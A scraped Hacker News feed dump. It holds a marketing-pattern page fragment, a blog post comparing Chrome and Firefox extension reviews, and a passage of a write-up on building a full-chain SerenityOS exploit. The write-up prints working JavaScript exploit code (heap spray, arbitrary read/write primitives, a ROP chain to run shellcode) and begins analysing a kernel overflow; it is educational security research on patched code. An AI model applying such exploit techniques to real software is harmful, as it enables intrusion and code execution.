						<p>Prospective customers often compare products before they make a purchase. Use this pattern to get in front of them during this crucial phase and remind them why your product is superior. </p>						<p><time datetime="2020-09-23T15:33:47+00:00">09/23/2020 3:33pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-cancel-jacking/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png" alt="cancel jacking 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Steal Competitors Customers With Cancel Jacking 20" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								

			</section>
		</div></div>]]>
            </description>
            <link>https://terrygodier.com/patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116276</guid>
            <pubDate>Fri, 12 Feb 2021 17:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's time to port your extension to Firefox]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 17 (<a href="https://news.ycombinator.com/item?id=26116105">thread link</a>) | @DanielDe
<br/>
February 12, 2021 | https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox | <a href="https://web.archive.org/web/*/https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
        <h4>February 12th, 2021 · 5 minute read</h4>

        <p>
          I've seen quite a <a href="https://news.ycombinator.com/item?id=21990566">few</a> <a href="https://blog.pushbullet.com/2020/05/13/lets-guess-what-google-requires-in-14-days-or-they-kill-our-extension/">people</a> <a href="https://blog.lipsurf.com/part-ii-after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why/">complaining</a> lately about the Kafkaesque Chrome extension review process, so when I started running into my own problems with the Chrome Web Store I wasn't exactly surprised.
        </p>

        <p>
          It wasn’t until I submitted the same extension to the Firefox Add-Ons Store that I saw just how good things could be. In a world of walled gardens watched over by heavy handed reviewers, Firefox's review process was laughably good.
        </p>

        <section>
          

          <p>
            In January 2020 my buddy and I started working on an idea we had for an automation app. We called it Otto.
          </p>

          <p>
            Otto consisted of two parts: a Mac app and a browser extension. After a few months worth of nights and weekends we had an alpha version we were ready to share with friends. I submitted the browser extension to Chrome under my own personal account, and after a review process of a couple days it was accepted. So far so good.
          </p>
        </section>

        <section>
          

          <p>
            The trouble started a few months later. After some more development and discussion, we re-framed our idea as an app to make custom keyboard shortcuts and we decided to rename Otto to <a href="https://keysmith.app/">Keysmith</a>. We also took the time at this point to create a company Google account. We renamed the extension and submitted it from our new company account.
          </p>

          <p>
            To be clear: changing the name was the <i>only</i> change we made.
          </p>

          <p>
            A few days later we received a rejection email. Here's a timeline of our interaction:
          </p>

          <div>
            
            <p>
                We submit Keysmith to the Chrome Web Store.
              </p>
          </div>

          <div>
            
            <div>
              <p>
                First rejection email.

                Quick summary:
              </p>

              <ul>
                <li>Keysmith "violates the 'Use of Permissions' section"</li>
                <li>We should "Request access to the narrowest permissions necessary"</li>
                <li>"If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality."</li>
                <li>We shouldn't attempt to "future proof"</li>
              </ul>
            </div>
          </div>

          <div>
            
            <div>
              <div><p>
                We double check the permissions we've requested and can't find any problems. We respond asking for more detail.
                </p><p>
                We also mention that we had previously submitted the <i>same</i> extension with the <i>same</i> requested permissions, just under a different name (Otto). We hoped they'd say "oh, in that case we'll approve this right away!". But instead:
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                Otto, our <i>existing extension</i>, is removed from the store and no additional detail on the rejection is provided. In fact, this email contains the <i>same exact</i> text as the previous one.
              </p>
          </div>

          <div>
            
            <p>
                We respond, again asking for more detail. We ask if it would help if we expanded on how we're using each permission in the permissions justification section.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the <i>exact same text again</i>. No further detail. No help at all.
              </p>
          </div>

          <div>
            
            <p>
                We suspect these reviews are entirely automated, so we ask if we can speak to a "human reviewer", hoping this will trigger a manual review (we also consider dropping an f-bomb for the same reason, but decide to remain decent for now).
              </p>
          </div>

          <div>
            
            <p>
                They respond with some <i>slightly</i> different text, but still nothing useful.
              </p>
          </div>

          <div>
            
            <p>
                We try adding a lot more detail to the "justification" section for each of the permissions we use and we resubmit.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the exact same text as the first rejection.
              </p>
          </div>

          <div>
            
            <p>
                We respond with one more plea for more more information.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the same text again.
              </p>
          </div>
        </section>

        <section>
          

          <p>
            At this point I dig into Chrome's documentation once again with a fine-tooth comb and I make a discovery: we had been requesting both the <span>tabs</span> and <span>activeTab</span> permissions, but since we also requested permission to run on <span>&lt;all_urls&gt;</span> it turns out that the features made available by <span>activeTab</span> were a strict subset of the features made available by <span>tabs</span>. So the <span>activeTab</span> permission was redundant. We weren't opening up any new functionality, we were just asking for a <i>redundant</i> permission.
          </p>

          <p>
            This discovery made the Chrome review team's communications far more frustrating in retrospect. The line that all of their emails repeated was "Request access to the narrowest permissions necessary". And, sure, we had asked for <span>activeTab</span> when we didn't need it, but that permission <i>didn't grant us any more functionality</i>. They had rejected our extension 6 times with no detail <i>because of a technicality</i>.
          </p>

          <p>
            We committed the 1 line diff removing the <span>activeTab</span> permission and resubmitted. A day later it was accepted.
          </p>
        </section>

        <section>
          

          <p>
            A Firefox version of our browser extension had long been on our list, but for the first little while it didn't feel worth the additional support cost. We didn't know exactly how large that cost would be, but we suspected that there would be enough differences between the two browsers that it'd be a bit of a hassle to maintain them both.
          </p>

          <p>
            Boy were we wrong. When we finally started looking into porting our extension to Firefox we found that we had to make <i>zero</i> changes to the code. None whatsoever. Firefox even supported the use of the global <span>chrome</span> object for accessing extension APIs (if you're curious, Chrome is not kind enough to return the favor).
          </p>

          <p>
            So we created a Firefox developer account, submitted our extension, and girded ourselves for another rough ride.
          </p>

          <p>
            <i>Boy were we wrong.</i>
          </p>

          <div>
            
            <p>
                We submit the first version of our extension to Firefox.
              </p>
          </div>

          <div>
            
            <div>
              <div><p>
                Less than 3 hours later we receive an email from Firefox that says, in effect, "Sorry this is taking so long, but we'll get to it soon!"
                </p><p>
                Responses from the Chrome team usually came in the wee hours of the morning, making the effective turnaround about 24 hours. Firefox apologizing after fewer than 3 hours was <i>hilarious</i> to us.
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                We get an email saying the extension was accepted exactly 24 hours after submission.
              </p>
          </div>

          <p>
            Further updates have been even speedier, usually only taking 2 or 3 minutes to be scanned and accepted. One of our updates even got accepted before I finished uploading the unminified source archive (which they require if you minify in production). And the dashboard shows your position in the review queue to give you some idea of when it'll complete.
          </p>

          <p>
            Needless to say, this was a breath of fresh air, and we won't be neglecting support for Firefox ever again in the future.
          </p>
        </section>

        <section>
          

          <p>
            I realize that in some ways this is an unfair comparison. Chrome's market share is much larger than Firefox's these days, so surely they also have to deal with far more extension submissions.
          </p>

          <p>
            But the lack of transparency in their process was infuriating and counter-productive. Had someone taken the time to manually review our case, or at least <i>read any of the emails</i> we sent, we could've resolved this issue with one response. Instead it took 6 responses and a week of wondering if this review process would kill our product before it even launched.
          </p>

          <p>
            I really hope things improve, but I'm not counting on it.
          </p>

        </section>

        <hr>

        
      </div>
    </div></div>]]>
            </description>
            <link>https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116105</guid>
            <pubDate>Fri, 12 Feb 2021 17:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ghost in the MP3 (2014)]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 59 (<a href="https://news.ycombinator.com/item?id=26116062">thread link</a>) | @Tomte
<br/>
February 12, 2021 | http://theghostinthemp3.com/theghostinthemp3.html | <a href="https://web.archive.org/web/*/http://theghostinthemp3.com/theghostinthemp3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://theghostinthemp3.com/theghostinthemp3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116062</guid>
            <pubDate>Fri, 12 Feb 2021 17:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Writing a Full Chain Exploit]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26115141">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>I recently came across <a href="https://github.com/SerenityOS/serenity">SerenityOS</a> when it was featured in hxp CTF and then on <a href="https://twitter.com/liveoverflow">LiveOverflow’s</a> YouTube channel. SerenityOS is an open source operating system written from scratch by <a href="https://twitter.com/awesomekling">Andreas Kling</a> and now has a strong and active community behind it. If you’d like to learn a bit more about it then the recent <a href="https://cppcast.com/serenity-os/">CppCast episode</a> is a good place to start, as well as all of the <a href="https://www.youtube.com/andreaskling">fantastic videos by Andreas Kling</a>.</p>

<p>Two of the recent videos were about writing exploits for a <a href="https://www.youtube.com/watch?v=LMvjaoBLPxA">typed array bug in javascript</a>, and a <a href="https://www.youtube.com/watch?v=gt6-TC6FtMs">kernel bug in munmap</a>. The videos were great to watch and got me thinking that it would be fun to try and find a couple of bugs that could be chained together to create a full chain exploit such as exploiting a browser bug to exploit a kernel bug to get root access.</p>

<h3 id="entrypoint">Entrypoint</h3>

<p>I started looking around and discovered an integer overflow when creating a typed array from an array buffer, the length was multiplied by the element size which could overflow.
<a href="https://github.com/SerenityOS/serenity/blob/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b/Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69">Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69</a></p>

<div><div><pre><code><span>static</span> <span>void</span> <span>initialize_typed_array_from_array_buffer</span><span>(</span><span>GlobalObject</span><span>&amp;</span> <span>global_object</span><span>,</span> <span>TypedArrayBase</span><span>&amp;</span> <span>typed_array</span><span>,</span> <span>ArrayBuffer</span><span>&amp;</span> <span>array_buffer</span><span>,</span> <span>Value</span> <span>byte_offset</span><span>,</span> <span>Value</span> <span>length</span><span>)</span>
<span>{</span>
    <span>// SNIP ...</span>

    <span>auto</span> <span>buffer_byte_length</span> <span>=</span> <span>array_buffer</span><span>.</span><span>byte_length</span><span>();</span>
    <span>size_t</span> <span>new_byte_length</span><span>;</span>
    <span>if</span> <span>(</span><span>length</span><span>.</span><span>is_undefined</span><span>())</span> <span>{</span>
        <span>if</span> <span>(</span><span>buffer_byte_length</span> <span>%</span> <span>element_size</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayInvalidBufferLength</span><span>,</span> <span>typed_array</span><span>.</span><span>class_name</span><span>(),</span> <span>element_size</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffset</span><span>,</span> <span>offset</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>new_byte_length</span> <span>=</span> <span>buffer_byte_length</span> <span>-</span> <span>offset</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>new_byte_length</span> <span>=</span> <span>new_length</span> <span>*</span> <span>element_size</span><span>;</span>
        <span>if</span> <span>(</span><span>offset</span> <span>+</span> <span>new_byte_length</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffsetOrLength</span><span>,</span> <span>offset</span><span>,</span> <span>offset</span> <span>+</span> <span>new_byte_length</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>typed_array</span><span>.</span><span>set_viewed_array_buffer</span><span>(</span><span>&amp;</span><span>array_buffer</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_length</span><span>(</span><span>new_byte_length</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_offset</span><span>(</span><span>offset</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_array_length</span><span>(</span><span>new_byte_length</span> <span>/</span> <span>element_size</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This could be used to create two powerful primitives, one that could read an arbitrary address and the other that could read an arbitrary amount from some allocated memory. These were the same primitives that Kling created in his video which meant that the issue could be exploited in exactly the same way:</p>

<ul>
  <li>Finding a vtable pointer with the offset primitive by spraying lots of Numbers</li>
  <li>Use the deterministic memory layout to calculating the stack location</li>
  <li>Find the saved return address on the stack</li>
  <li>Overwriting it with a rop chain.</li>
</ul>

<p>While I was looking into exploiting this, someone else spotted the same issue and it was quickly patched.</p>

<p><a href="https://github.com/SerenityOS/serenity/commit/f6c6047e49f1517778f5565681fb64750b14bf60"><img src="https://devcraft.io/assets/serenity/slack.jpg" alt="slack"></a></p>

<p>As I had already started and wanted to keep using the same issue, I kept working from <a href="https://github.com/SerenityOS/serenity/commit/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b">this commit</a> which still had the bug :)</p>

<p>Exploiting the issue is pretty much identical to the video above and it does a great job explaining what is going on, so I wont go into too much detail. Here Is what I ended up with:</p>

<div><div><pre><code><span>&lt;script&gt;</span>
  <span>function</span> <span>log</span><span>(</span><span>msg</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>msg</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>starting hax</span><span>"</span><span>);</span>

  <span>const</span> <span>AAAs</span> <span>=</span> <span>2261634.509804</span><span>;</span>
  <span>const</span> <span>spray_size</span> <span>=</span> <span>2000</span><span>;</span>
  <span>const</span> <span>spray</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>spray_size</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>// Create an array with a null backing store allowing arbitary rw</span>
  <span>ab1</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>();</span>
  <span>ua1</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab1</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>// Create an array with a large length but a valid backing store</span>
  <span>ab2</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>(</span><span>0x50000</span><span>);</span>
  <span>ua2</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab2</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>done spraying</span><span>"</span><span>);</span>

  <span>function</span> <span>read</span><span>(</span><span>addr</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write</span><span>(</span><span>addr</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>// 0x6c000 is the offset from the array buffer to the next heap allocation</span>
  <span>function</span> <span>read_heap</span><span>(</span><span>off</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write_heap</span><span>(</span><span>off</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>number_i</span> <span>=</span> <span>0</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>looking for 0x41414141</span><span>"</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>100</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read_heap</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>0x41414141</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read_heap</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>(</span><span>16</span><span>));</span>
      <span>number_i</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>number_i_vtable</span> <span>=</span> <span>number_i</span> <span>-</span> <span>8</span><span>;</span>

  <span>const</span> <span>libjs_data_addr</span> <span>=</span> <span>read_heap</span><span>(</span><span>number_i_vtable</span><span>)</span> <span>-</span> <span>0x28ac</span><span>;</span>
  <span>const</span> <span>libjs_addr</span> <span>=</span> <span>libjs_data_addr</span> <span>-</span> <span>0xe0000</span><span>;</span>
  <span>const</span> <span>stack_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x2537000</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>libjs_data_addr 0x</span><span>"</span> <span>+</span> <span>libjs_data_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>libjs_addr 0x</span><span>"</span> <span>+</span> <span>libjs_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>stack_addr 0x</span><span>"</span> <span>+</span> <span>stack_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

  <span>log</span><span>(</span><span>"</span><span>looking for stack return</span><span>"</span><span>);</span>
  <span>let</span> <span>stack_ret</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>stack_addr</span> <span>+</span> <span>0x400000</span> <span>-</span> <span>4</span><span>;</span> <span>i</span> <span>&gt;</span> <span>stack_addr</span><span>;</span> <span>i</span> <span>-=</span> <span>4</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>libjs_addr</span> <span>+</span> <span>0x5af5e</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found stack_ret 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>());</span>
      <span>stack_ret</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>0x12345678</span><span>);</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>Loading the above in the browser resulting in a crash at <code>0x12345678</code>:</p>

<div><div><pre><code>[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: Unrecoverable page fault, instruction fetch / read from address V0x12345678
[Browser(37:37)]: CRASH: CPU #0 Page Fault. Ring 3.
[Browser(37:37)]: exception code: 0014 (isr: 0000
[Browser(37:37)]:   pc=001b:12345678 flags=0246
[Browser(37:37)]:  stk=0023:026ff2e4
[Browser(37:37)]:   ds=0023 es=0023 fs=0023 gs=002b
[Browser(37:37)]: eax=026ff3c0 ebx=0491ce8c ecx=00000000 edx=0491e4a0
[Browser(37:37)]: ebp=026ff378 esp=c2a48fe8 esi=00000005 edi=02d0dfd8
[Browser(37:37)]: cr0=80010013 cr2=12345678 cr3=07351000 cr4=003006e4
[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: 0x12345678  (?)
</code></pre></div></div>

<p>Since we can write any amount to the stack, it was fairly straight forward to build a rop chain that mmapped a region, put some shellcode there, mprotected it to make it executable, then jump there:</p>

<div><div><pre><code><span>const</span> <span>libc_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x122000</span><span>;</span>
<span>const</span> <span>mmap_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b379</span><span>;</span>
<span>const</span> <span>memcpy_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x002f51d</span><span>;</span>
<span>const</span> <span>mprotect_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b487</span><span>;</span>

<span>const</span> <span>shellcode</span> <span>=</span> <span>[</span><span>0xcccccccc</span><span>];</span>

<span>// write our shellcode to a know location (start of the stack)</span>
<span>const</span> <span>shellcode_addr</span> <span>=</span> <span>stack_addr</span><span>;</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>shellcode</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>shellcode_addr</span> <span>+</span> <span>i</span> <span>*</span> <span>4</span><span>,</span> <span>shellcode</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>log</span><span>(</span><span>"</span><span>shellcode_addr: 0x</span><span>"</span> <span>+</span> <span>shellcode_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// rop gadgets</span>
<span>// 0x000462f3: pop esi; pop edi; pop ebp; ret;</span>
<span>// 0x0007bda9: add esp, 0x10; pop esi; pop edi; pop ebp; ret;</span>

<span>pop7_addr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x0007bda9</span><span>;</span>
<span>pop3_adr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x000462f3</span><span>;</span>

<span>log</span><span>(</span><span>"</span><span>pop7_addr: 0x</span><span>"</span> <span>+</span> <span>pop7_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
<span>log</span><span>(</span><span>"</span><span>pop3_adr: 0x</span><span>"</span> <span>+</span> <span>pop3_adr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// 1. map region at 0x9d000000</span>
<span>// 2. memcpy our shellcode there</span>
<span>// 3. make it executable</span>
<span>// 4. jump there</span>
<span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>mmap_addr</span><span>);</span>
<span>const</span> <span>rop</span> <span>=</span> <span>[</span>
  <span>pop7_addr</span><span>,</span> <span>//ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>3</span><span>,</span>
  <span>0x32</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0xdeadbeef</span><span>,</span>

  <span>memcpy_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>shellcode_addr</span><span>,</span>
  <span>0x8000</span><span>,</span>

  <span>mprotect_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>5</span><span>,</span>

  <span>0x9d000000</span><span>,</span>
<span>];</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>rop</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>stack_ret</span> <span>+</span> <span>4</span> <span>*</span> <span>(</span><span>2</span> <span>+</span> <span>i</span><span>),</span> <span>rop</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>// finish to trigger the rop chain</span>
</code></pre></div></div>

<p>After loading this up and setting a breakpoint with gdb at <code>0x9d000000</code>:</p>

<p><img src="https://devcraft.io/assets/serenity/gef.jpg" alt="gef"></p>

<p>Success! Arbitrary code in the browser.</p>

<h3 id="kernel-bug-hunting">Kernel Bug Hunting</h3>

<p>Next it was time to try and find a kernel bug that could be reached from the browser process. There had been a few issues with integer overflows, so I started looking for places that this might happen. After some searching I saw the following in <a href="https://github.com/SerenityOS/serenity/blob/22b0ff05d4a5b087d805d8147ca12efe410cb18f/Kernel/VM/RangeAllocator.cpp#L139">RangeAllocator::allocate_anywhere</a>:</p>

<div><div><pre><code><span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>m_available_ranges</span><span>.</span><span>size</span><span>();</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
    <span>auto</span><span>&amp;</span> <span>available_range</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>i</span><span>];</span>

    <span>// FIXME: This check is probably excluding some valid candidates when using a large alignment.</span>
    <span>if</span> <span>(</span><span>available_range</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>effective_size</span> <span>+</span> <span>alignment</span><span>))</span>
        <span>continue</span><span>;</span>
</code></pre></div></div>

<p>Each process has a list of available ranges that are used when allocating memory regions. This code is looping through all the ranges and seeing if there is one large enough to hold the requested size, taking into account the alignment (both <code>effective_size</code> and <code>alignment</code> are controlled by the user). The issue is that <code>effective_size + alignment</code> can overflow, resulting in a range being chosen that is too small to hold the requested size.</p>

<p>The <code>available_range</code> is then used to create a new allocated range:</p>

<div><div><pre><code>    <span>FlatPtr</span> <span>initial_base</span> <span>=</span> <span>available_range</span><span>.</span><span>base</span><span>().</span><span>offset</span><span>(</span><span>offset_from_effective_base</span><span>).</span><span>get</span><span>();</span>
    <span>FlatPtr</span> <span>aligned_base</span> <span>=</span> <span>round_up_to_power_of_two</span><span>(</span><span>initial_base</span><span>,</span> <span>alignment</span><span>);</span>

    <span>Range</span> <span>allocated_range</span><span>(</span><span>VirtualAddress</span><span>(</span><span>aligned_base</span><span>),</span> <span>size</span><span>);</span>
    <span>if</span> <span>(</span><span>available_range</span> <span>==</span> <span>allocated_range</span><span>)</span> <span>{</span>
        <span>dbgln</span><span>&lt;</span><span>VRA_DEBUG</span><span>&gt;</span><span>(</span><span>"VRA: Allocated perfect-fit anywhere({}, {}): {}"</span><span>,</span> <span>size</span><span>,</span> <span>alignment</span><span>,</span> <span>allocated_range</span><span>.</span><span>base</span><span>().</span><span>get</span><span>());</span>
        <span>m_available_ranges</span><span>.</span><span>remove</span><span>(</span><span>i</span><span>);</span>
        <span>return</span> <span>allocated_range</span><span>;</span>
    <span>}</span>
    <span>carve_at_index</span><span>(</span><span>i</span><span>,</span> <span>allocated_range</span><span>);</span>

    <span>return</span> <span>allocated_range</span><span>;</span>
</code></pre></div></div>

<p>If it isn’t exactly equal then it carves out the range and add the remaining range back into <code>m_available_ranges</code>:</p>

<div><div><pre><code><span>void</span> <span>RangeAllocator</span><span>::</span><span>carve_at_index</span><span>(</span><span>int</span> <span>index</span><span>,</span> <span>const</span> <span>Range</span><span>&amp;</span> <span>range</span><span>)</span>
<span>{</span>
    <span>ASSERT</span><span>(</span><span>m_lock</span><span>.</span><span>is_locked</span><span>());</span>
